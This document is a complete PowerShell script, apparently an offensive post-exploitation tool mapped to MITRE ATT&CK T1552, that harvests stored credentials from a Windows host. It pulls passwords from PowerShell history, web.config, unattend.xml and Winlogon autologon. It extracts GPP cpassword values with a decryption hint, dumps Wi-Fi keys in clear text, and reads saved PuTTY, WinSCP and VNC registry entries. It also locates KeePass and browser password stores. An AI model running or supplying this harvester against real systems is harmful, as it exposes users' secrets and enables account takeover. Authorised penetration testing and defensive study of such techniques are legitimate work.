<#
.SYNOPSIS
    Search for stored credentials across common Windows locations.
.DESCRIPTION
    Checks PowerShell history, IIS web.config, unattend.xml, GPP cpassword,
    Wi-Fi profiles, .NET connection strings, registry, Sticky Notes, KeePass,
    browser password DB paths, and more.
.NOTES
    MITRE ATT&CK: T1552 — Unsecured Credentials
#>

function Write-Banner {
    param([string]$Title)
    Write-Output "`n$("=" * 60)"
    Write-Output "  $Title"
    Write-Output "$("=" * 60)`n"
}

Write-Banner "POWERSHELL HISTORY (T1552.003)"
$histPaths = @(
    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
) + (Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName)

foreach ($h in ($histPaths | Sort-Object -Unique)) {
    if (Test-Path $h) {
        Write-Output "[+] $h"
        $matches = Select-String -Path $h -Pattern 'password|passwd|pwd|credential|secret|token|apikey|connectionstring' -AllMatches -ErrorAction SilentlyContinue
        foreach ($m in $matches) { Write-Output "    Line $($m.LineNumber): $($m.Line.Trim())" }
    }
}

Write-Banner "IIS WEB.CONFIG FILES"
$webConfigs = @(
    "C:\inetpub\wwwroot\web.config",
    "C:\inetpub\wwwroot\*\web.config"
) + (Get-ChildItem "C:\inetpub" -Recurse -Filter "web.config" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName)

foreach ($wc in ($webConfigs | Sort-Object -Unique)) {
    if (Test-Path $wc) {
        Write-Output "[+] $wc"
        $matches = Select-String -Path $wc -Pattern 'connectionString|password|pwd|User ID|Data Source' -ErrorAction SilentlyContinue
        foreach ($m in $matches) { Write-Output "    $($m.Line.Trim())" }
    }
}

Write-Banner "UNATTEND / SYSPREP FILES (T1552.001)"
$unattendPaths = @(
    "C:\unattend.xml",
    "C:\Windows\Panther\unattend.xml",
    "C:\Windows\Panther\Unattend\unattend.xml",
    "C:\Windows\System32\sysprep\unattend.xml",
    "C:\Windows\System32\sysprep\sysprep.xml",
    "C:\Windows\System32\sysprep\Panther\unattend.xml"
)
foreach ($u in $unattendPaths) {
    if (Test-Path $u) {
        Write-Output "[!] FOUND: $u"
        $content = Get-Content $u -Raw
        if ($content -match 'Password|UserAccounts|AutoLogon') {
            $matches = Select-String -InputObject $content -Pattern '<Password>.*?</Password>' -AllMatches
            foreach ($m in $matches.Matches) { Write-Output "    $($m.Value)" }
            $matches = Select-String -InputObject $content -Pattern '<Value>.*?</Value>' -AllMatches
            foreach ($m in $matches.Matches) { Write-Output "    $($m.Value)" }
        }
    }
}

Write-Banner "GROUP POLICY PREFERENCES CPASSWORD (T1552.006)"
$gppPaths = @(
    "\\$($env:USERDNSDOMAIN)\SYSVOL\$($env:USERDNSDOMAIN)\Policies"
)
foreach ($gpp in $gppPaths) {
    if (Test-Path $gpp) {
        $xmlFiles = Get-ChildItem $gpp -Recurse -Include "Groups.xml","Services.xml","Scheduledtasks.xml","Datasources.xml","Printers.xml","Drives.xml" -ErrorAction SilentlyContinue
        foreach ($x in $xmlFiles) {
            $content = Get-Content $x.FullName -Raw
            if ($content -match 'cpassword="([^"]+)"') {
                Write-Output "[!] GPP cpassword found: $($x.FullName)"
                Write-Output "    cpassword: $($Matches[1])"
                Write-Output "    Decrypt with: gpp-decrypt '$($Matches[1])'"
            }
        }
    }
}

Write-Banner "WI-FI PASSWORDS"
$profiles = netsh wlan show profiles 2>$null | Select-String 'All User Profile\s+:\s+(.+)' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
foreach ($p in $profiles) {
    $key = netsh wlan show profile name="$p" key=clear 2>$null | Select-String 'Key Content\s+:\s+(.+)' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    if ($key) {
        Write-Output "[+] Wi-Fi: $p — Password: $key"
    }
}

Write-Banner ".NET CONNECTION STRINGS"
$configFiles = Get-ChildItem "C:\inetpub","C:\Program Files","C:\Program Files (x86)","$env:LOCALAPPDATA" -Recurse -Include "*.config","*.xml" -ErrorAction SilentlyContinue |
    Where-Object { $_.Length -lt 1MB }
$configFiles | Select-Object -First 100 | ForEach-Object {
    $matches = Select-String -Path $_.FullName -Pattern 'connectionString=|Data Source=.*Password=' -ErrorAction SilentlyContinue
    if ($matches) {
        Write-Output "[+] $($_.FullName)"
        foreach ($m in $matches) { Write-Output "    $($m.Line.Trim())" }
    }
}

Write-Banner "REGISTRY STORED PASSWORDS"
$regPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    "HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions",
    "HKCU:\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions",
    "HKLM:\SOFTWARE\RealVNC\WinVNC4",
    "HKCU:\SOFTWARE\TightVNC\Server",
    "HKLM:\SOFTWARE\ORL\WinVNC3\Default"
)
foreach ($r in $regPaths) {
    if (Test-Path $r) {
        Write-Output "[+] Registry: $r"
        $props = Get-ItemProperty $r -ErrorAction SilentlyContinue
        $props.PSObject.Properties | Where-Object {
            $_.Name -match 'password|passwd|pwd|DefaultPassword|ProxyPassword' -and $_.Value
        } | ForEach-Object {
            Write-Output "    $($_.Name) = $($_.Value)"
        }
        if ($r -match 'PuTTY') {
            Get-ChildItem $r -ErrorAction SilentlyContinue | ForEach-Object {
                $session = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
                if ($session.HostName) {
                    Write-Output "    Session: $($_.PSChildName) -> $($session.HostName):$($session.PortNumber) user=$($session.UserName)"
                }
            }
        }
    }
}

Write-Banner "WINDOWS AUTOLOGON"
$winlogon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
if ($winlogon.DefaultPassword) {
    Write-Output "[!] AutoLogon credentials:"
    Write-Output "    Domain   : $($winlogon.DefaultDomainName)"
    Write-Output "    Username : $($winlogon.DefaultUserName)"
    Write-Output "    Password : $($winlogon.DefaultPassword)"
}

Write-Banner "STICKY NOTES"
$stickyDb = "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
if (Test-Path $stickyDb) {
    Write-Output "[+] Sticky Notes DB: $stickyDb"
    Write-Output "    Open with: sqlite3 $stickyDb `"SELECT Text FROM Note`""
}

Write-Banner "KEEPASS CONFIG"
$keepassConfigs = Get-ChildItem "C:\Users","C:\Program Files","C:\Program Files (x86)" -Recurse -Filter "KeePass.config.xml" -ErrorAction SilentlyContinue
foreach ($kc in $keepassConfigs) {
    Write-Output "[+] KeePass config: $($kc.FullName)"
    $content = Get-Content $kc.FullName -Raw
    if ($content -match 'RecentlyUsedFiles|KeyFilePath') {
        $dbPaths = Select-String -InputObject $content -Pattern '<Path>(.+?)</Path>' -AllMatches
        foreach ($m in $dbPaths.Matches) { Write-Output "    Database: $($m.Groups[1].Value)" }
    }
}
$kdbx = Get-ChildItem "C:\Users" -Recurse -Filter "*.kdbx" -ErrorAction SilentlyContinue
foreach ($db in $kdbx) { Write-Output "[+] KeePass database: $($db.FullName)" }

Write-Banner "BROWSER PASSWORD DB LOCATIONS"
$browserDbs = @(
    @{Name="Chrome";   Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
    @{Name="Edge";     Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
    @{Name="Firefox";  Path="$env:APPDATA\Mozilla\Firefox\Profiles"},
    @{Name="Brave";    Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"}
)
foreach ($b in $browserDbs) {
    if (Test-Path $b.Path) {
        Write-Output "[+] $($b.Name): $($b.Path)"
    }
}

Write-Banner "CREDENTIAL MANAGER"
cmdkey /list 2>$null

Write-Output "`n[*] Credential search complete."
